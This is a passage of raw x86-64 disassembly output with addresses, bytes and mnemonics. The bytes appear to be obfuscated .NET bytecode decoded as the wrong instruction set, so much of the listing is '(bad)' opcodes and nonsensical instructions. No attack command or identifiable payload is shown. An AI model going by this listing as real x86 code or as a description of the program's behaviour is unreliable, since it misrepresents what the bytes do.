  4040f1:	0e                   	(bad)
  4040f2:	2b 00                	sub    (%rax),%eax
  4040f4:	20 00                	and    %al,(%rax)
  4040f6:	00 00                	add    %al,(%rax)
  4040f8:	00 38                	add    %bh,(%rax)
  4040fa:	7e f3                	jle    0x4040ef
  4040fc:	ff                   	(bad)
  4040fd:	ff 16                	call   *(%rsi)
  4040ff:	13 0a                	adc    (%rdx),%ecx
  404101:	20 7a 00             	and    %bh,0x0(%rdx)
  404104:	00 00                	add    %al,(%rax)
  404106:	fe 0e                	decb   (%rsi)
  404108:	33 00                	xor    (%rax),%eax
  40410a:	16                   	(bad)
  40410b:	39 70 f3             	cmp    %esi,-0xd(%rax)
  40410e:	ff                   	(bad)
  40410f:	ff                   	(bad)
  404110:	fe 0c 27             	decb   (%rdi,%riz,1)
  404113:	00 20                	add    %ah,(%rax)
  404115:	19 00                	sbb    %eax,(%rax)
  404117:	00 00                	add    %al,(%rax)
  404119:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  40411c:	00 9c 20 a6 00 00 00 	add    %bl,0xa6(%rax,%riz,1)
  404123:	38 5c f3 ff          	cmp    %bl,-0x1(%rbx,%rsi,8)
  404127:	ff                   	(bad)
  404128:	fe 0c 27             	decb   (%rdi,%riz,1)
  40412b:	00 20                	add    %ah,(%rax)
  40412d:	12 00                	adc    (%rax),%al
  40412f:	00 00                	add    %al,(%rax)
  404131:	20 a0 00 00 00 20    	and    %ah,0x20000000(%rax)
  404137:	35 00 00 00 59       	xor    $0x59000000,%eax
  40413c:	9c                   	pushf
  40413d:	20 26                	and    %ah,(%rsi)
  40413f:	00 00                	add    %al,(%rax)
  404141:	00 fe                	add    %bh,%dh
  404143:	0e                   	(bad)
  404144:	33 00                	xor    (%rax),%eax
  404146:	38 35 f3 ff ff fe    	cmp    %dh,-0x100000d(%rip)        # 0xffffffffff40413f
  40414c:	0c 27                	or     $0x27,%al
  40414e:	00 20                	add    %ah,(%rax)
  404150:	19 00                	sbb    %eax,(%rax)
  404152:	00 00                	add    %al,(%rax)
  404154:	20 43 00             	and    %al,0x0(%rbx)
  404157:	00 00                	add    %al,(%rax)
  404159:	20 4d 00             	and    %cl,0x0(%rbp)
  40415c:	00 00                	add    %al,(%rax)
  40415e:	58                   	pop    %rax
  40415f:	9c                   	pushf
  404160:	20 0e                	and    %cl,(%rsi)
  404162:	00 00                	add    %al,(%rax)
  404164:	00 38                	add    %bh,(%rax)
  404166:	12 f3                	adc    %bl,%dh
  404168:	ff                   	(bad)
  404169:	ff 11                	call   *(%rcx)
  40416b:	16                   	(bad)
  40416c:	1e                   	(bad)
  40416d:	58                   	pop    %rax
  40416e:	13 16                	adc    (%rsi),%edx
  404170:	20 9b 00 00 00 fe    	and    %bl,-0x2000000(%rbx)
  404176:	0e                   	(bad)
  404177:	33 00                	xor    (%rax),%eax
  404179:	16                   	(bad)
  40417a:	39 01                	cmp    %eax,(%rcx)
  40417c:	f3 ff                	repz (bad)
  40417e:	ff 20                	jmp    *(%rax)
  404180:	ef                   	out    %eax,(%dx)
  404181:	00 00                	add    %al,(%rax)
  404183:	00 20                	add    %ah,(%rax)
  404185:	4f 00 00             	rex.WRXB add %r8b,(%r8)
  404188:	00 59 fe             	add    %bl,-0x2(%rcx)
  40418b:	0e                   	(bad)
  40418c:	0c 00                	or     $0x0,%al
  40418e:	20 5c 01 00          	and    %bl,0x0(%rcx,%rax,1)
  404192:	00 38                	add    %bh,(%rax)
  404194:	e4 f2                	in     $0xf2,%al
  404196:	ff                   	(bad)
  404197:	ff 11                	call   *(%rcx)
  404199:	28 11                	sub    %dl,(%rcx)
  40419b:	01 17                	add    %edx,(%rdi)
  40419d:	59                   	pop    %rcx
  40419e:	40 13 00             	rex adc (%rax),%eax
  4041a1:	00 00                	add    %al,(%rax)
  4041a3:	20 78 01             	and    %bh,0x1(%rax)
  4041a6:	00 00                	add    %al,(%rax)
  4041a8:	fe 0e                	decb   (%rsi)
  4041aa:	33 00                	xor    (%rax),%eax
  4041ac:	38 cf                	cmp    %cl,%bh
  4041ae:	f2 ff                	repnz (bad)
  4041b0:	ff                   	(bad)
  4041b1:	38 9e 19 00 00 11    	cmp    %bl,0x11000019(%rsi)
  4041b7:	0a 11                	or     (%rcx),%dl
  4041b9:	1c 58                	sbb    $0x58,%al
  4041bb:	13 0a                	adc    (%rdx),%ecx
  4041bd:	20 31                	and    %dh,(%rcx)
  4041bf:	01 00                	add    %eax,(%rax)
  4041c1:	00 fe                	add    %bh,%dh
  4041c3:	0e                   	(bad)
  4041c4:	33 00                	xor    (%rax),%eax
  4041c6:	38 d0                	cmp    %dl,%al
  4041c8:	27                   	(bad)
  4041c9:	00 00                	add    %al,(%rax)
  4041cb:	39 b0 f2 ff ff 20    	cmp    %esi,0x20fffff2(%rax)
  4041d1:	cb                   	lret
  4041d2:	00 00                	add    %al,(%rax)
  4041d4:	00 20                	add    %ah,(%rax)
  4041d6:	43 00 00             	rex.XB add %al,(%r8)
  4041d9:	00 59 fe             	add    %bl,-0x2(%rcx)
  4041dc:	0e                   	(bad)
  4041dd:	2b 00                	sub    (%rax),%eax
  4041df:	20 3f                	and    %bh,(%rdi)
  4041e1:	01 00                	add    %eax,(%rax)
  4041e3:	00 fe                	add    %bh,%dh
  4041e5:	0e                   	(bad)
  4041e6:	33 00                	xor    (%rax),%eax
  4041e8:	16                   	(bad)
  4041e9:	39 92 f2 ff ff fe    	cmp    %edx,-0x100000e(%rdx)
  4041ef:	0c 27                	or     $0x27,%al
  4041f1:	00 20                	add    %ah,(%rax)
  4041f3:	10 00                	adc    %al,(%rax)
  4041f5:	00 00                	add    %al,(%rax)
  4041f7:	20 47 00             	and    %al,0x0(%rdi)
  4041fa:	00 00                	add    %al,(%rax)
  4041fc:	20 21                	and    %ah,(%rcx)
  4041fe:	00 00                	add    %al,(%rax)
  404200:	00 59 9c             	add    %bl,-0x64(%rcx)
  404203:	20 ee                	and    %ch,%dh
  404205:	00 00                	add    %al,(%rax)
  404207:	00 38                	add    %bh,(%rax)
  404209:	77 f2                	ja     0x4041fd
  40420b:	ff                   	(bad)
  40420c:	ff 20                	jmp    *(%rax)
  40420e:	55                   	push   %rbp
  40420f:	00 00                	add    %al,(%rax)
  404211:	00 20                	add    %ah,(%rax)
  404213:	68 00 00 00 58       	push   $0x58000000
  404218:	fe 0e                	decb   (%rsi)
  40421a:	0c 00                	or     $0x0,%al
  40421c:	20 60 01             	and    %ah,0x1(%rax)
  40421f:	00 00                	add    %al,(%rax)
  404221:	38 56 f2             	cmp    %dl,-0xe(%rsi)
  404224:	ff                   	(bad)
  404225:	ff 20                	jmp    *(%rax)
  404227:	55                   	push   %rbp
  404228:	00 00                	add    %al,(%rax)
  40422a:	00 20                	add    %ah,(%rax)
  40422c:	5e                   	pop    %rsi
  40422d:	00 00                	add    %al,(%rax)
  40422f:	00 58 fe             	add    %bl,-0x2(%rax)
  404232:	0e                   	(bad)
  404233:	2b 00                	sub    (%rax),%eax
  404235:	20 92 00 00 00 38    	and    %dl,0x38000000(%rdx)
  40423b:	45                   	rex.RB
  40423c:	f2 ff                	repnz (bad)
  40423e:	ff                   	(bad)
  40423f:	fe 0c 27             	decb   (%rdi,%riz,1)
  404242:	00 20                	add    %ah,(%rax)
  404244:	1b 00                	sbb    (%rax),%eax
  404246:	00 00                	add    %al,(%rax)
  404248:	20 b1 00 00 00 20    	and    %dh,0x20000000(%rcx)
  40424e:	3b 00                	cmp    (%rax),%eax
  404250:	00 00                	add    %al,(%rax)
  404252:	59                   	pop    %rcx
  404253:	9c                   	pushf
  404254:	20 ac 01 00 00 38 1e 	and    %ch,0x1e380000(%rcx,%rax,1)
  40425b:	f2 ff                	repnz (bad)
  40425d:	ff 11                	call   *(%rcx)
  40425f:	10 11                	adc    %dl,(%rcx)
  404261:	25 8e 69 3f df       	and    $0xdf3f698e,%eax
  404266:	1a 00                	sbb    (%rax),%al
  404268:	00 20                	add    %ah,(%rax)
  40426a:	88 01                	mov    %al,(%rcx)
  40426c:	00 00                	add    %al,(%rax)
  40426e:	38 11                	cmp    %dl,(%rcx)
  404270:	f2 ff                	repnz (bad)
  404272:	ff                   	(bad)
  404273:	fe 0c 27             	decb   (%rdi,%riz,1)
  404276:	00 20                	add    %ah,(%rax)
  404278:	16                   	(bad)
  404279:	00 00                	add    %al,(%rax)
  40427b:	00 20                	add    %ah,(%rax)
  40427d:	44 00 00             	add    %r8b,(%rax)
  404280:	00 20                	add    %ah,(%rax)
  404282:	2e 00 00             	cs add %al,(%rax)
  404285:	00 58 9c             	add    %bl,-0x64(%rax)
  404288:	20 01                	and    %al,(%rcx)
  40428a:	00 00                	add    %al,(%rax)
  40428c:	00 fe                	add    %bh,%dh
  40428e:	0e                   	(bad)
  40428f:	33 00                	xor    (%rax),%eax
  404291:	38 ea                	cmp    %ch,%dl
  404293:	f1                   	int1
  404294:	ff                   	(bad)
  404295:	ff                   	(bad)
  404296:	fe 0c 27             	decb   (%rdi,%riz,1)
  404299:	00 20                	add    %ah,(%rax)
  40429b:	0e                   	(bad)
  40429c:	00 00                	add    %al,(%rax)
  40429e:	00 20                	add    %ah,(%rax)
  4042a0:	a0 00 00 00 20 35 00 	movabs 0x3520000000,%al
  4042a7:	00 00 
  4042a9:	59                   	pop    %rcx
  4042aa:	9c                   	pushf
  4042ab:	20 4b 01             	and    %cl,0x1(%rbx)
  4042ae:	00 00                	add    %al,(%rax)
  4042b0:	38 c7                	cmp    %al,%bh
  4042b2:	f1                   	int1
  4042b3:	ff                   	(bad)
  4042b4:	ff 20                	jmp    *(%rax)
  4042b6:	a6                   	cmpsb  (%rdi),(%rsi)
  4042b7:	00 00                	add    %al,(%rax)
  4042b9:	00 20                	add    %ah,(%rax)
  4042bb:	37                   	(bad)
  4042bc:	00 00                	add    %al,(%rax)
  4042be:	00 59 fe             	add    %bl,-0x2(%rcx)
  4042c1:	0e                   	(bad)
  4042c2:	2b 00                	sub    (%rax),%eax
  4042c4:	20 65 00             	and    %ah,0x0(%rbp)
  4042c7:	00 00                	add    %al,(%rax)
  4042c9:	fe 0e                	decb   (%rsi)
  4042cb:	33 00                	xor    (%rax),%eax
  4042cd:	16                   	(bad)
  4042ce:	39 ad f1 ff ff fe    	cmp    %ebp,-0x100000f(%rbp)
  4042d4:	0c 27                	or     $0x27,%al
  4042d6:	00 20                	add    %ah,(%rax)
  4042d8:	17                   	(bad)
  4042d9:	00 00                	add    %al,(%rax)
  4042db:	00 fe                	add    %bh,%dh
  4042dd:	0c 2b                	or     $0x2b,%al
  4042df:	00 9c 20 8e 00 00 00 	add    %bl,0x8e(%rax,%riz,1)
  4042e6:	fe 0e                	decb   (%rsi)
  4042e8:	33 00                	xor    (%rax),%eax
  4042ea:	38 b6 26 00 00 3a    	cmp    %dh,0x3a000026(%rsi)
  4042f0:	8c f1                	mov    %?,%ecx
  4042f2:	ff                   	(bad)
  4042f3:	ff                   	(bad)
  4042f4:	fe 0c 27             	decb   (%rdi,%riz,1)
  4042f7:	00 20                	add    %ah,(%rax)
  4042f9:	0c 00                	or     $0x0,%al
  4042fb:	00 00                	add    %al,(%rax)
  4042fd:	20 4c 00 00          	and    %cl,0x0(%rax,%rax,1)
  404301:	00 20                	add    %ah,(%rax)
  404303:	6b 00 00             	imul   $0x0,(%rax),%eax
  404306:	00 58 9c             	add    %bl,-0x64(%rax)
  404309:	20 28                	and    %ch,(%rax)
  40430b:	00 00                	add    %al,(%rax)
  40430d:	00 38                	add    %bh,(%rax)
  40430f:	71 f1                	jno    0x404302
  404311:	ff                   	(bad)
  404312:	ff 11                	call   *(%rcx)
  404314:	0e                   	(bad)
  404315:	1e                   	(bad)
  404316:	62 13 0e 20 37       	(bad)
  40431b:	01 00                	add    %eax,(%rax)
  40431d:	00 fe                	add    %bh,%dh
  40431f:	0e                   	(bad)
  404320:	33 00                	xor    (%rax),%eax
  404322:	38 88 26 00 00 39    	cmp    %cl,0x39000026(%rax)
  404328:	8c 24 00             	mov    %fs,(%rax,%rax,1)
  40432b:	00 38                	add    %bh,(%rax)
  40432d:	4f f1                	rex.WRXB int1
  40432f:	ff                   	(bad)
  404330:	ff                   	(bad)
  404331:	fe 0c 27             	decb   (%rdi,%riz,1)
  404334:	00 20                	add    %ah,(%rax)
  404336:	12 00                	adc    (%rax),%al
  404338:	00 00                	add    %al,(%rax)
  40433a:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  40433d:	00 9c 20 34 01 00 00 	add    %bl,0x134(%rax,%riz,1)
  404344:	38 33                	cmp    %dh,(%rbx)
  404346:	f1                   	int1
  404347:	ff                   	(bad)
  404348:	ff                   	(bad)
  404349:	fe 0c 27             	decb   (%rdi,%riz,1)
  40434c:	00 20                	add    %ah,(%rax)
  40434e:	13 00                	adc    (%rax),%eax
  404350:	00 00                	add    %al,(%rax)
  404352:	20 8b 00 00 00 20    	and    %cl,0x20000000(%rbx)
  404358:	24 00                	and    $0x0,%al
  40435a:	00 00                	add    %al,(%rax)
  40435c:	58                   	pop    %rax
  40435d:	9c                   	pushf
  40435e:	20 5d 01             	and    %bl,0x1(%rbp)
  404361:	00 00                	add    %al,(%rax)
  404363:	fe 0e                	decb   (%rsi)
  404365:	33 00                	xor    (%rax),%eax
  404367:	38 14 f1             	cmp    %dl,(%rcx,%rsi,8)
  40436a:	ff                   	(bad)
  40436b:	ff                   	(bad)
  40436c:	fe 0c 27             	decb   (%rdi,%riz,1)
  40436f:	00 20                	add    %ah,(%rax)
  404371:	16                   	(bad)
  404372:	00 00                	add    %al,(%rax)
  404374:	00 fe                	add    %bh,%dh
  404376:	0c 0c                	or     $0xc,%al
  404378:	00 9c 20 ac 00 00 00 	add    %bl,0xac(%rax,%riz,1)
  40437f:	38 00                	cmp    %al,(%rax)
  404381:	f1                   	int1
  404382:	ff                   	(bad)
  404383:	ff 20                	jmp    *(%rax)
  404385:	09 00                	or     %eax,(%rax)
  404387:	00 00                	add    %al,(%rax)
  404389:	20 27                	and    %ah,(%rdi)
  40438b:	00 00                	add    %al,(%rax)
  40438d:	00 58 fe             	add    %bl,-0x2(%rax)
  404390:	0e                   	(bad)
  404391:	0c 00                	or     $0x0,%al
  404393:	20 99 01 00 00 38    	and    %bl,0x38000001(%rcx)
  404399:	e7 f0                	out    %eax,$0xf0
  40439b:	ff                   	(bad)
  40439c:	ff                   	(bad)
  40439d:	38 85 07 00 00 11    	cmp    %al,0x11000007(%rbp)
  4043a3:	1b 16                	sbb    (%rsi),%edx
  4043a5:	3e 59                	ds pop %rcx
  4043a7:	fc                   	cld
  4043a8:	ff                   	(bad)
  4043a9:	ff 20                	jmp    *(%rax)
  4043ab:	68 00 00 00 38       	push   $0x38000000
  4043b0:	d0 f0                	shl    $1,%al
  4043b2:	ff                   	(bad)
  4043b3:	ff 20                	jmp    *(%rax)
  4043b5:	c0 00 00             	rolb   $0x0,(%rax)
  4043b8:	00 20                	add    %ah,(%rax)
  4043ba:	40 00 00             	rex add %al,(%rax)
  4043bd:	00 59 fe             	add    %bl,-0x2(%rcx)
  4043c0:	0e                   	(bad)
  4043c1:	0c 00                	or     $0x0,%al
  4043c3:	20 35 01 00 00 38    	and    %dh,0x38000001(%rip)        # 0x384043ca
  4043c9:	b7 f0                	mov    $0xf0,%bh
  4043cb:	ff                   	(bad)
  4043cc:	ff                   	(bad)
  4043cd:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  4043d0:	00 20                	add    %ah,(%rax)
  4043d2:	06                   	(bad)
  4043d3:	00 00                	add    %al,(%rax)
  4043d5:	00 20                	add    %ah,(%rax)
  4043d7:	65 00 00             	add    %al,%gs:(%rax)
  4043da:	00 20                	add    %ah,(%rax)
  4043dc:	22 00                	and    (%rax),%al
  4043de:	00 00                	add    %al,(%rax)
  4043e0:	58                   	pop    %rax
  4043e1:	9c                   	pushf
  4043e2:	20 2e                	and    %ch,(%rsi)
  4043e4:	01 00                	add    %eax,(%rax)
  4043e6:	00 38                	add    %bh,(%rax)
  4043e8:	90                   	nop
  4043e9:	f0 ff                	lock (bad)
  4043eb:	ff 20                	jmp    *(%rax)
  4043ed:	50                   	push   %rax
  4043ee:	00 00                	add    %al,(%rax)
  4043f0:	00 20                	add    %ah,(%rax)
  4043f2:	6f                   	outsl  (%rsi),(%dx)
  4043f3:	00 00                	add    %al,(%rax)
  4043f5:	00 58 fe             	add    %bl,-0x2(%rax)
  4043f8:	0e                   	(bad)
  4043f9:	2b 00                	sub    (%rax),%eax
  4043fb:	20 88 00 00 00 fe    	and    %cl,-0x2000000(%rax)
  404401:	0e                   	(bad)
  404402:	33 00                	xor    (%rax),%eax
  404404:	38 77 f0             	cmp    %dh,-0x10(%rdi)
  404407:	ff                   	(bad)
  404408:	ff                   	(bad)
  404409:	fe 0c 27             	decb   (%rdi,%riz,1)
  40440c:	00 20                	add    %ah,(%rax)
  40440e:	0e                   	(bad)
  40440f:	00 00                	add    %al,(%rax)
  404411:	00 20                	add    %ah,(%rax)
  404413:	a3 00 00 00 20 40 00 	movabs %eax,0x4020000000
  40441a:	00 00 
  40441c:	58                   	pop    %rax
  40441d:	9c                   	pushf
  40441e:	20 72 00             	and    %dh,0x0(%rdx)
  404421:	00 00                	add    %al,(%rax)
  404423:	fe 0e                	decb   (%rsi)
  404425:	33 00                	xor    (%rax),%eax
  404427:	17                   	(bad)
  404428:	3a 53 f0             	cmp    -0x10(%rbx),%dl
  40442b:	ff                   	(bad)
  40442c:	ff 20                	jmp    *(%rax)
  40442e:	0a 00                	or     (%rax),%al
  404430:	00 00                	add    %al,(%rax)
  404432:	20 3b                	and    %bh,(%rbx)
  404434:	00 00                	add    %al,(%rax)
  404436:	00 58 fe             	add    %bl,-0x2(%rax)
  404439:	0e                   	(bad)
  40443a:	2b 00                	sub    (%rax),%eax
  40443c:	20 7e 00             	and    %bh,0x0(%rsi)
  40443f:	00 00                	add    %al,(%rax)
  404441:	38 3e                	cmp    %bh,(%rsi)
  404443:	f0 ff                	lock (bad)
  404445:	ff 20                	jmp    *(%rax)
  404447:	33 00                	xor    (%rax),%eax
  404449:	00 00                	add    %al,(%rax)
  40444b:	20 0c 00             	and    %cl,(%rax,%rax,1)
  40444e:	00 00                	add    %al,(%rax)
  404450:	58                   	pop    %rax
  404451:	fe 0e                	decb   (%rsi)
  404453:	0c 00                	or     $0x0,%al
  404455:	20 70 01             	and    %dh,0x1(%rax)
  404458:	00 00                	add    %al,(%rax)
  40445a:	38 1d f0 ff ff fe    	cmp    %bl,-0x1000010(%rip)        # 0xffffffffff404450
  404460:	0c 2f                	or     $0x2f,%al
  404462:	00 20                	add    %ah,(%rax)
  404464:	0b 00                	or     (%rax),%eax
  404466:	00 00                	add    %al,(%rax)
  404468:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  40446b:	00 9c 20 99 00 00 00 	add    %bl,0x99(%rax,%riz,1)
  404472:	fe 0e                	decb   (%rsi)
  404474:	33 00                	xor    (%rax),%eax
  404476:	17                   	(bad)
  404477:	3a 04 f0             	cmp    (%rax,%rsi,8),%al
  40447a:	ff                   	(bad)
  40447b:	ff 11                	call   *(%rcx)
  40447d:	2c 17                	sub    $0x17,%al
  40447f:	58                   	pop    %rax
  404480:	13 2c 20             	adc    (%rax,%riz,1),%ebp
  404483:	39 01                	cmp    %eax,(%rcx)
  404485:	00 00                	add    %al,(%rax)
  404487:	38 f0                	cmp    %dh,%al
  404489:	ef                   	out    %eax,(%dx)
  40448a:	ff                   	(bad)
  40448b:	ff                   	(bad)
  40448c:	fe 0c 27             	decb   (%rdi,%riz,1)
  40448f:	00 20                	add    %ah,(%rax)
  404491:	0a 00                	or     (%rax),%al
  404493:	00 00                	add    %al,(%rax)
  404495:	20 27                	and    %ah,(%rdi)
  404497:	00 00                	add    %al,(%rax)
  404499:	00 20                	add    %ah,(%rax)
  40449b:	67 00 00             	add    %al,(%eax)
  40449e:	00 58 9c             	add    %bl,-0x64(%rax)
  4044a1:	20 1a                	and    %bl,(%rdx)
  4044a3:	01 00                	add    %eax,(%rax)
  4044a5:	00 38                	add    %bh,(%rax)
  4044a7:	d9 ef                	(bad)
  4044a9:	ff                   	(bad)
  4044aa:	ff 20                	jmp    *(%rax)
  4044ac:	64 00 00             	add    %al,%fs:(%rax)
  4044af:	00 20                	add    %ah,(%rax)
  4044b1:	26 00 00             	es add %al,(%rax)
  4044b4:	00 58 fe             	add    %bl,-0x2(%rax)
  4044b7:	0e                   	(bad)
  4044b8:	2b 00                	sub    (%rax),%eax
  4044ba:	20 59 00             	and    %bl,0x0(%rcx)
  4044bd:	00 00                	add    %al,(%rax)
  4044bf:	fe 0e                	decb   (%rsi)
  4044c1:	33 00                	xor    (%rax),%eax
  4044c3:	38 b8 ef ff ff 20    	cmp    %bh,0x20ffffef(%rax)
  4044c9:	b0 00                	mov    $0x0,%al
  4044cb:	00 00                	add    %al,(%rax)
  4044cd:	20 3a                	and    %bh,(%rdx)
  4044cf:	00 00                	add    %al,(%rax)
  4044d1:	00 59 fe             	add    %bl,-0x2(%rcx)
  4044d4:	0e                   	(bad)
  4044d5:	2b 00                	sub    (%rax),%eax
  4044d7:	20 2b                	and    %ch,(%rbx)
  4044d9:	00 00                	add    %al,(%rax)
  4044db:	00 fe                	add    %bh,%dh
  4044dd:	0e                   	(bad)
  4044de:	33 00                	xor    (%rax),%eax
  4044e0:	16                   	(bad)
  4044e1:	39 9a ef ff ff 20    	cmp    %ebx,0x20ffffef(%rdx)
  4044e7:	03 00                	add    (%rax),%eax
  4044e9:	00 00                	add    %al,(%rax)
  4044eb:	20 63 00             	and    %ah,0x0(%rbx)
  4044ee:	00 00                	add    %al,(%rax)
  4044f0:	58                   	pop    %rax
  4044f1:	fe 0e                	decb   (%rsi)
  4044f3:	2b 00                	sub    (%rax),%eax
  4044f5:	20 de                	and    %bl,%dh
  4044f7:	00 00                	add    %al,(%rax)
  4044f9:	00 fe                	add    %bh,%dh
  4044fb:	0e                   	(bad)
  4044fc:	33 00                	xor    (%rax),%eax
  4044fe:	16                   	(bad)
  4044ff:	39 7c ef ff          	cmp    %edi,-0x1(%rdi,%rbp,8)
  404503:	ff                   	(bad)
  404504:	fe 0c 27             	decb   (%rdi,%riz,1)
  404507:	00 20                	add    %ah,(%rax)
  404509:	05 00 00 00 20       	add    $0x20000000,%eax
  40450e:	73 00                	jae    0x404510
  404510:	00 00                	add    %al,(%rax)
  404512:	20 36                	and    %dh,(%rsi)
  404514:	00 00                	add    %al,(%rax)
  404516:	00 59 9c             	add    %bl,-0x64(%rcx)
  404519:	20 2d 01 00 00 38    	and    %ch,0x38000001(%rip)        # 0x38404520
  40451f:	61                   	(bad)
  404520:	ef                   	out    %eax,(%dx)
  404521:	ff                   	(bad)
  404522:	ff                   	(bad)
  404523:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404526:	00 20                	add    %ah,(%rax)
  404528:	07                   	(bad)
  404529:	00 00                	add    %al,(%rax)
  40452b:	00 fe                	add    %bh,%dh
  40452d:	0c 1e                	or     $0x1e,%al
  40452f:	00 9c 20 f4 00 00 00 	add    %bl,0xf4(%rax,%riz,1)
  404536:	38 49 ef             	cmp    %cl,-0x11(%rcx)
  404539:	ff                   	(bad)
  40453a:	ff 11                	call   *(%rcx)
  40453c:	25 38 77 24 00       	and    $0x247738,%eax
  404541:	00 20                	add    %ah,(%rax)
  404543:	30 01                	xor    %al,(%rcx)
  404545:	00 00                	add    %al,(%rax)
  404547:	fe 0e                	decb   (%rsi)
  404549:	33 00                	xor    (%rax),%eax
  40454b:	38 30                	cmp    %dh,(%rax)
  40454d:	ef                   	out    %eax,(%dx)
  40454e:	ff                   	(bad)
  40454f:	ff                   	(bad)
  404550:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404553:	00 20                	add    %ah,(%rax)
  404555:	03 00                	add    (%rax),%eax
  404557:	00 00                	add    %al,(%rax)
  404559:	20 81 00 00 00 20    	and    %al,0x20000000(%rcx)
  40455f:	2b 00                	sub    (%rax),%eax
  404561:	00 00                	add    %al,(%rax)
  404563:	59                   	pop    %rcx
  404564:	9c                   	pushf
  404565:	20 d4                	and    %dl,%ah
  404567:	00 00                	add    %al,(%rax)
  404569:	00 fe                	add    %bh,%dh
  40456b:	0e                   	(bad)
  40456c:	33 00                	xor    (%rax),%eax
  40456e:	16                   	(bad)
  40456f:	39 0c ef             	cmp    %ecx,(%rdi,%rbp,8)
  404572:	ff                   	(bad)
  404573:	ff                   	(bad)
  404574:	fe 0c 27             	decb   (%rdi,%riz,1)
  404577:	00 20                	add    %ah,(%rax)
  404579:	09 00                	or     %eax,(%rax)
  40457b:	00 00                	add    %al,(%rax)
  40457d:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  404580:	00 9c 20 a4 00 00 00 	add    %bl,0xa4(%rax,%riz,1)
  404587:	fe 0e                	decb   (%rsi)
  404589:	33 00                	xor    (%rax),%eax
  40458b:	38 33                	cmp    %dh,(%rbx)
  40458d:	24 00                	and    $0x0,%al
  40458f:	00 3a                	add    %bh,(%rdx)
  404591:	c2 f7 ff             	ret    $0xfff7
  404594:	ff                   	(bad)
  404595:	38 e6                	cmp    %ah,%dh
  404597:	ee                   	out    %al,(%dx)
  404598:	ff                   	(bad)
  404599:	ff                   	(bad)
  40459a:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40459d:	00 20                	add    %ah,(%rax)
  40459f:	0e                   	(bad)
  4045a0:	00 00                	add    %al,(%rax)
  4045a2:	00 20                	add    %ah,(%rax)
  4045a4:	58                   	pop    %rax
  4045a5:	00 00                	add    %al,(%rax)
  4045a7:	00 20                	add    %ah,(%rax)
  4045a9:	44 00 00             	add    %r8b,(%rax)
  4045ac:	00 58 9c             	add    %bl,-0x64(%rax)
  4045af:	20 9d 00 00 00 fe    	and    %bl,-0x2000000(%rbp)
  4045b5:	0e                   	(bad)
  4045b6:	33 00                	xor    (%rax),%eax
  4045b8:	38 c3                	cmp    %al,%bl
  4045ba:	ee                   	out    %al,(%dx)
  4045bb:	ff                   	(bad)
  4045bc:	ff                   	(bad)
  4045bd:	fe 0c 27             	decb   (%rdi,%riz,1)
  4045c0:	00 20                	add    %ah,(%rax)
  4045c2:	00 00                	add    %al,(%rax)
  4045c4:	00 00                	add    %al,(%rax)
  4045c6:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4045c9:	00 9c 20 57 00 00 00 	add    %bl,0x57(%rax,%riz,1)
  4045d0:	fe 0e                	decb   (%rsi)
  4045d2:	33 00                	xor    (%rax),%eax
  4045d4:	16                   	(bad)
  4045d5:	39 a6 ee ff ff 11    	cmp    %esp,0x11ffffee(%rsi)
  4045db:	2e 1a 5a 13          	cs sbb 0x13(%rdx),%bl
  4045df:	09 20                	or     %esp,(%rax)
  4045e1:	a7                   	cmpsl  (%rdi),(%rsi)
  4045e2:	01 00                	add    %eax,(%rax)
  4045e4:	00 fe                	add    %bh,%dh
  4045e6:	0e                   	(bad)
  4045e7:	33 00                	xor    (%rax),%eax
  4045e9:	38 df                	cmp    %bl,%bh
  4045eb:	23 00                	and    (%rax),%eax
  4045ed:	00 3a                	add    %bh,(%rdx)
  4045ef:	8d                   	lea    (bad),%ebp
  4045f0:	ee                   	out    %al,(%dx)
  4045f1:	ff                   	(bad)
  4045f2:	ff                   	(bad)
  4045f3:	fe 0c 27             	decb   (%rdi,%riz,1)
  4045f6:	00 20                	add    %ah,(%rax)
  4045f8:	0a 00                	or     (%rax),%al
  4045fa:	00 00                	add    %al,(%rax)
  4045fc:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4045ff:	00 9c 20 1e 01 00 00 	add    %bl,0x11e(%rax,%riz,1)
  404606:	fe 0e                	decb   (%rsi)
  404608:	33 00                	xor    (%rax),%eax
  40460a:	17                   	(bad)
  40460b:	3a 70 ee             	cmp    -0x12(%rax),%dh
  40460e:	ff                   	(bad)
  40460f:	ff 20                	jmp    *(%rax)
  404611:	0f 00 00             	sldt   (%rax)
  404614:	00 20                	add    %ah,(%rax)
  404616:	08 00                	or     %al,(%rax)
  404618:	00 00                	add    %al,(%rax)
  40461a:	58                   	pop    %rax
  40461b:	fe 0e                	decb   (%rsi)
  40461d:	1e                   	(bad)
  40461e:	00 20                	add    %ah,(%rax)
  404620:	7c 01                	jl     0x404623
  404622:	00 00                	add    %al,(%rax)
  404624:	fe 0e                	decb   (%rsi)
  404626:	33 00                	xor    (%rax),%eax
  404628:	38 aa 23 00 00 39    	cmp    %ch,0x39000023(%rdx)
  40462e:	4e ee                	rex.WRX out %al,(%dx)
  404630:	ff                   	(bad)
  404631:	ff                   	(bad)
  404632:	fe 0c 27             	decb   (%rdi,%riz,1)
  404635:	00 20                	add    %ah,(%rax)
  404637:	03 00                	add    (%rax),%eax
  404639:	00 00                	add    %al,(%rax)
  40463b:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  40463e:	00 9c 20 ae 00 00 00 	add    %bl,0xae(%rax,%riz,1)
  404645:	38 32                	cmp    %dh,(%rdx)
  404647:	ee                   	out    %al,(%dx)
  404648:	ff                   	(bad)
  404649:	ff                   	(bad)
  40464a:	fe 0c 27             	decb   (%rdi,%riz,1)
  40464d:	00 20                	add    %ah,(%rax)
  40464f:	00 00                	add    %al,(%rax)
  404651:	00 00                	add    %al,(%rax)
  404653:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  404656:	00 9c 20 c6 00 00 00 	add    %bl,0xc6(%rax,%riz,1)
  40465d:	38 22                	cmp    %ah,(%rdx)
  40465f:	ee                   	out    %al,(%dx)
  404660:	ff                   	(bad)
  404661:	ff 20                	jmp    *(%rax)
  404663:	89 00                	mov    %eax,(%rax)
  404665:	00 00                	add    %al,(%rax)
